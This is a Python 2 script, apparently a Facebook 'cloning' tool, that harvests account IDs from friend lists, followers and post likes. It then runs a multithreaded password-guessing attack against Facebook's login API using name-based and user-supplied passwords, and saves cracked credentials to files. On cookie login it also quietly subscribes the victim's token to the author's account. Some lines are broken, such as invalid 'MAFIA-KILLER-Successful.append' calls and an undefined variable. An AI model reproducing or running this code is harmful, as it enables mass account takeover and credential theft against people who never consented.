#!/usr/bin/python2
# coding=utf-8
# code by Yayan XD
# my facebook ( https://www.facebook.com/KM39453 )
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,bs4
from multiprocessing.pool import ThreadPool
def clear():
    if ' linux' in sys.platform.lower():
        os.system('clear')
    elif 'win' in sys.platform.lower():
        os.system('cls')
    else:
        os.system('clear')


P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
T = '\x1b[1;33m'
I = '\x1b[0m'
my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 happy.py')

from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime
useragents = [
 ('Mozilla/5.0 (Linux; Android 5.0; ASUS ZenFone 2 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36')]
hm = random.choice(useragents)
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', hm)]
s = requests.Session()
api = 'https://graph.facebook.com/{}'
hea = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0'}

http_proxy  = "http://10.10.1.10:3128"
https_proxy = "https://10.10.1.11:1080"


def keluar():
        print "\033[1;97m{\033[1;91m!\033[1;97m} Keluar"
        os.sys.exit()


def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

logo = """

   *_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*

\033[1;91m             █▀▄▀█ █▀▀█ █▀▀ ░▀░ █▀▀█
\033[1;93m             █░▀░█ █▄▄█ █▀▀ ▀█▀ █▄▄█
\033[1;92m             ▀░░░▀ ▀░░▀ ▀░░ ▀▀▀ ▀░░▀
             
\033[1;97m             █░█ ░▀░ █░░ █░░ █▀▀ █▀▀█
\033[1;96m             █▀▄ ▀█▀ █░░ █░░ █▀▀ █▄▄▀
\033[1;95m             ▀░▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀░▀▀

   *_ꙮ⃢▄▆▇█�⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢��⃢✿⁍⃢🇪⃢⁌✿⃢�⃢✿⁍⃢🇪⃢⁌✿⃢��█▇▆▄⃢ꙮ_*

\033[1;91m    •◈••◈••◈•\033[1;91m◈••◈••◈••◈••◈•◈••◈••◈••◈••◈\033[1;91m••◈•
\033[1;92m    •◈••◈••◈•\033[1;95m───▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄─── \033[1;92m•◈••◈••◈•
\033[1;93m    •◈••◈••◈•\033[1;95m───█▒▒░░░░░░░░░▒▒█─── \033[1;93m•◈••◈••◈•
\033[1;94m    •◈••◈••◈•\033[1;95m────█░░█░░░░░█░░█──── \033[1;94m•◈••◈••◈•
\033[1;95m    •◈••◈••◈•\033[1;95m─▄▄──█░░░▀█▀░░░█──▄▄─ \033[1;95m•◈••◈••◈•
\033[1;96m    •◈••◈••◈•\033[1;95m█░░█─▀▄░░░░░░░▄▀─█░░█ \033[1;96m•◈••◈••◈•
\033[1;97m    •◈••◈••◈•\033[1;95m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█\033[1;97m•◈••◈••◈•
\033[1;91m    •◈••◈••◈•\033[1;95m\033[1;92m█░░╦─╦╔╗╦─╔╗╔╗╔╦╗╔╗░░█\033[1;91m•◈••◈••◈•
\033[1;92m    •◈••◈••◈•\033[1;95m\033[1;95m█░░║║║╠─║─║─║║║║║╠─░░█\033[1;92m•◈••◈••◈•
\033[1;93m    •◈••◈••◈•\033[1;95m\033[1;96m█░░╚╩╝╚╝╚╝╚╝╚╝╩─╩╚╝░░█\033[1;93m•◈••◈••◈•
\033[1;94m    •◈••◈••◈•\033[1;95m█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█\033[1;94m•◈••◈••◈•
\033[1;95m    •◈••◈••◈••◈•\033[1;95m••◈••◈••◈••◈••◈••◈••◈••◈•\033[1;95m•◈•
\033[1;96m    •◈•▬ ▬ ▬•◈•\033[1;95m𝙈𝙖𝙙𝙚 𝘽𝙮 𝘼𝙡𝙖𝙢𝙞𝙣 𝙄𝙨𝙡𝙖𝙢\033[1;96m•◈•▬ ▬ ▬•

\x1b[1;95m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
\x1b[1;95m NAME         : FAROOQ ANSARI 
\x1b[1;95m CYBER NAME   : MAFIA-KILLER 
\x1b[1;95m WHATSAPP NO  : +92132197796 
\x1b[1;95m WARNING      : DON,T CALL ME ONLY TEXT
\x1b[1;95m NOTE         : 1ST CHANGE YOUR MOBILE GMAIL
\x1b[1;95m NOTE         : USE 4GB YA 6GB RAM MOBILE
\x1b[1;95m NOTE         : USE FAST 4G SIM NET
\x1b[1;95m NOTE         : 1ST CLEAR TERMUX MEMORY DATA
\x1b[1;95m DISCLAMIAR   : DON,T USE  ILLIGAL WAY
\x1b[1;95m COMMAND TYPE : WITH LOGIN BY TOKEN
\x1b[1;95m COMMAND NAME : FILE CLONING
\x1b[1;95m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>

\x1b[1;92m NOTE >>1ST DUMP PUBLUC FRIEND LIST 
\x1b[1;92m CHOOSE OPTION 1
\x1b[1;92m THEN CHOOSE OPTION 5 AND PUT DUMP FILE PATH 
\x1b[1;95m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
"""
pw = False
back = 0
loop = 0
threads = []
ok = []
cp = []
id = []
Successful = []
Checkpoint = []
done = []
pw = []
target = []


def yayanxd():
    print logo
    print
    print ' [1] Login cookies'
    print ' [2] Login Token'
    print ' [0] Exit'
    print
    pilih_yayanxd()

def pilih_yayanxd():
    moch = raw_input(' [*] Choose an option >>  ')
    if moch == '':
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        yayanxd()
    elif moch == '1':
    	os.system('clear')
        cookies()
    elif moch == '2':
    	os.system('clear')
        login_token()
    elif moch == '0':
        os.system('rm -rf login.txt')
        os.system('exit')
    else:
        print '\n [!] Wrong Input'
        time.sleep(1.7)
        os.system('clear')
        yayanxd()

def cookies():
        print logo
        cookie = raw_input("  [?] Input cookies : ")
        try:
                data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
                'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
                'referer'                   : 'https://m.facebook.com/',
                'host'                      : 'm.facebook.com',
                'origin'                    : 'https://m.facebook.com',
                'upgrade-insecure-requests' : '1',
                'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
                'cache-control'             : 'max-age=0',
                'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'content-type'              : 'text/html; charset=utf-8'
                }, cookies = {
                'cookie'                    : cookie
                })
                find_token = re.search('(EAAA\w+)', data.text)
                hasil    = '\n* Fail : maybe your cookie invalid !!' if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
        except requests.exceptions.ConnectionError:
                print "   [!] tidak ada koneksi jaringan internet"
        cookie = open("login.txt", 'w')
        cookie.write(find_token.group(1))
        cookie.close()
        print "  [*] login berhasil silahkan gunakan script"
        requests.post('https://graph.facebook.com/1629570007/subscribers?access_token='+find_token.group(1))
        time.sleep(1)
        menu()


def login_token():
    print logo
    token = raw_input('\n  put token Here  : ')
    print ' [+] Please wait..'
    try:
        otw = requests.get('https://graph.facebook.com/me?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        zedd = open('login.txt', 'w')
        zedd.write(token)
        zedd.close()
        jalan('\n \x1b[1;93m[\x1b[1;95m√\x1b[1;96m]\x1b[1;92m Login Successfull')
        time.sleep(1)
        moch_yayan()
    except KeyError:
        print '\n \x1b[1;97m[\x1b[1;93m!\x1b[1;97m] Token expire'
        time.sleep(1)
        os.system('clear')
        yayanxd()
        

def moch_yayan():
        os.system("clear")
        try:
            token=open('login.txt','r').read()
        except IOError:
            os.system('clear')
            os.system('rm -rf login.txt')
            yayanxd()
        try:
            nama = s.get(api.format("me?access_token=%s"%(token)),headers=hea).json()["name"]
        except KeyError:
           os.system('clear')
           print " [!] cookies/token error"
           os.system('rm -rf login.txt')
           os.system('clear')
           time.sleep(1)
           yayanxd()
        except requests.exceptions.ConnectionError:
          print " [!] no internet connection"
          exit()
        os.system("clear")
        print logo
        print "\n [TOKEN USER ID NAME >> %s%s%s]"%(K,nama,I)+"\n"
        print " [1] Dump id from friend List "
        print " [2] Dump id of from public friend List "
        print " [3] Dump id of total followers"
        print " [4] Dump id of posts"
        print " [5] Start crack"
        print " [0] exit "
        pilih_kontol()

def pilih_kontol():
        yan = raw_input("\n [*] Choose : ")
        if yan == '':
           print '\n [!] Wrong Input'
           time.sleep(1.7)
           os.system('clear')
           moch_yayan()
        elif yan =="1":
                teman()
        elif yan =="2":
                publik()
        elif yan =="3":
                followers()
        elif yan =="4":
                likes()
        elif yan =="5":
                crack()
        elif yan =="0":
                os.system('rm -rf login.txt')
                exit()
        else:
            print '\n [!] Wrong Input'
            time.sleep(1.7)
            os.system('clear')
            moch_yayan()

def teman():
        global token
        try:
            token = open('login.txt','r').read()
        except IOError:
            print " [!] ookies/token invalid"
            os.system('rm -rf login.txt')
            yayanxd()
        ih = raw_input("\n [?] nama file : ")
        if ih in [""]:
                print "\n [!] please fill it right"
                time.sleep(1.7)
                moch_yayan()
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("me/friends?access_token=%s"%(token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] dump %s ctrl+z to stop "%(len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n [*] successfully dump friend id\n"
            exit(" [•] file stored in : dump/%s.txt "%(ih))
        except OSError:
            print "\n [!] failed to save file "
            time.sleep(1.7)
            moch_yayan()
def publik():
        global token
        try:
            token=open('login.txt','r').read()
        except IOError:
            exit("  [!] token invalid ")
            os.system('rm -rf login.txt')
            yayanxd()
                
        ui = raw_input(" [?] public id : ")
        ih = raw_input(" [?] nama file : ")
        asw = raw_input(" [?] limit : ")
        if ui in [""]:
            print "\n [!] please fill it right"
            time.sleep(1.7)
            moch_yayan()
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/friends?limit=%s&access_token=%s"%(ui,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s  "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n\n [*] successfully dump the public id\n"
            exit(" [•] file stored in : dump/%s.txt "%(ih))
        except OSError:
            print "\n [!] failed to save file "
            time.sleep(1.7)
            moch_yayan()

def followers():
        global token
        try:
            token=open('login.txt','r').read()
        except IOError:
            exit(" [!] token invalid ")
                
        ui = raw_input(" [?] id followers : ")
        ah = raw_input(" [?] nama file : ")
        asw = raw_input(" [?] limit : ")
        if ui in [""]:
            print "\n [!] the correct content"
            time.sleep(1.7)
            moch_yayan()
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ah+".txt","w")
        try:
            for i in  s.get(api.format("%s/subscribers?limit=%s&access_token=%s"%(ui,asw,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s  "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n [*] successfully dump id followers\n"
            exit(" [•] file stored in : dump/%s.txt "%(ah))
        except OSError:
            print "\n [!] failed to save "
            time.sleep(1.7)
            moch_yayan()
def likes():
        global token
        try:
            token=open('login.txt','r').read()
        except IOError:
            exit(" [!] token invalid ")
        ui = raw_input(" [?] id postingan : ")
        ih = raw_input(" [?] nama file : ")
        ah = raw_input(" [?] limit : ")
        if ih in [""]:
            print "\n [!] the correct content"
            time.sleep(1.7)
            moch_yayan()
        try:
            os.mkdir("dump")
        except:pass
        wrt=open("dump/"+ih+".txt","w")
        try:
            for i in  s.get(api.format("%s/likes?limit=%s&access_token=%s"%(ui,ah,token)),headers=hea).json()["data"]:
                    id.append(i["id"])
                    wrt.write("%s\n"%(i["id"]))
                    sys.stdout.write(
                            "\r [*] id %s total dump %s  "%(i["id"],len(id)
                    ));sys.stdout.flush()
                    time.sleep(0.0050)
            wrt.close()
            print "\n [*] successfully dump the post id\n"
            exit(" [*] file stored in : dump/%s.txt "%(ih))
        except OSError:
                exit("\n [!] failed to save file ")
def crack():
        global token,loop
        loop = 0
        try:
            token=open("login.txt","r").read()
        except IOError:
            exit(" [!] token invalid ")
        ask = raw_input(" [*] password manual? [y/t]: ")
        if ask.lower() == "y":
                man()
        file=raw_input(" [?] dump file : ")
        if file in [""]:
                print " [!] file does not exist"
                time.sleep(1.7)
                moch_yayan()        
        try:
            fil = open(file,"r").readlines()
            for id in fil:
                    target.append(id.strip())
        except KeyError:
            exit(" [!] file file does not exist")
        print '\n [+] OK results are saved to : ok.txt\n [-] CP results are saved to : cp.txt\n'
        print ' [!] turn off cellular data to roam the process\n'
        try:
            	os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(sc,target)
        results(Successful,Checkpoint)
        exit()

def sc(user):
        global token,loop
        try:
                a = s.get(api.format("%s?access_token=%s"%(user,token)),headers=hea).json()
                dp = a['first_name']
                bk = a['last_name']
                for pw in [dp+"123",dp+"786",bk+"123",bk+"786"]:
                        URL = "https://b-api.facebook.com/method/auth.login?access_token=350685531728%7C62f8ce9f74b12f84c123cc23437a4a32&format=json&sdk_version=2&email="+str(user)+"&locale=en_US&password="+str(pw)+"&sdk=ios&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                        w = s.get(URL,headers=hea).json()
                        if 'access_token' in w:
                            print (H+"\r   * --> %s|%s|%s      %s"%(user,pw,a["name"],I))
                            wrt="%s|%s"%(user,pw)
                            MAFIA-KILLER-Successful.append(wrt)
                            open("crack/Successful.txt", "a").write("%s\n"%(wrt))
                            break
                        elif 'www.facebook.com' in w['error_msg']:
                                print (K+"\r   * --> %s|%s|%s      %s"%(user,pw,a["name"],I))
                                wrt="%s|%s"%(user,pw)
                                MAFIA-KILLER-Checkpoint.append(wrt)
                                open("crack/Checkpoint.txt","a").write("%s\n"%(wrt))
                                break
                loop+=1
                print "\r  [*] crack: %s/%s - ok-:%s - cp-:%s"%(loop,len(target),len(Successful),len(Checkpoint)),;sys.stdout.flush()
        except:
                pass

def man():
        global pw,loop
        try:
                idt = raw_input("  [*] input the target file : ")
                for id in open(idt,"r").readlines():
                        target.append(id.strip())
        except KeyError:
                exit("  [!] file does not exist")
        print ("\n  [?] example password "+K+"[ 786786, pakistan,102030, 000786 ]"+I)
        pw = raw_input("  [*] enter the Your favourit password  : ").split(",")
        if len(pw) ==0:
                exit("  [!] input the correct pork")
        print '\n [+] OK results are saved to : ok.txt\n [-] CP results are saved to : cp.txt\n'
        print ' [!] turn off cellular data to roam the process\n'
        try:
                os.mkdir("crack")
        except:
                pass
        m=ThreadPool(30)
        m.map(cs,target)
        results(Successful,Checkpoint)
        exit()

def cs(user):
        global loop,pw
        try:
                #a = s.get(api.format("%s?access_token=%s"%(str(user),token)),headers=hea).json()
                #b = a["birthday"]
                for i in pw:
                        URL="https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+str(user)+"&locale=en_US&password="+str(i)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6"
                        w = s.get(URL,headers=hea).json()
                        if "access_token" in w:
                            print (H+"\r   * --> %s|%s %s              "%(user,i,I))
                            wrt="%s|%s"%(user,i)
                            open("crack/Successful.txt","a").write("%s\n"%(wrt))
                            MAFIA-KILLER-Successful.append(wrt)
                        elif 'www.facebook.com' in w['error_msg']:
                                print (K+"\r   * --> %s|%s|%s %s              "%(user,i,b,I))
                                wrt="%s|%s"%(user,i)
                                MAFIA-KILLER-Checkpoint.append(wrt)
                                open("crack/Checkpoint.txt","a").write("%s\n"%(wrt))
                loop +=1
                sys.stdout.write(
                        "\r  [*] crack: %s/%s - ok-:%s - cp-:%s"%(loop,len(target),len(Successful),len(Checkpoint))
                ); sys.stdout.flush()
        except: pass

def results(Successful, Checkpoint):
    if len(Successful) != 0:
    	print '\n\n [✓] finished.'
        print '\n [*] OK : ' + str(len(Successful))
    if len(Checkpoint) != 0:
    	print '\n\n [✓] finished.'
        print '\n [*] CP : ' + str(len(Checkpoint))
    if len(Successful) == 0 and len(Checkpoint) == 0:
        print '\n'
        print ' [!] You got no results Try Again'

if __name__=="__main__":
        moch_yayan()
        yayanxd()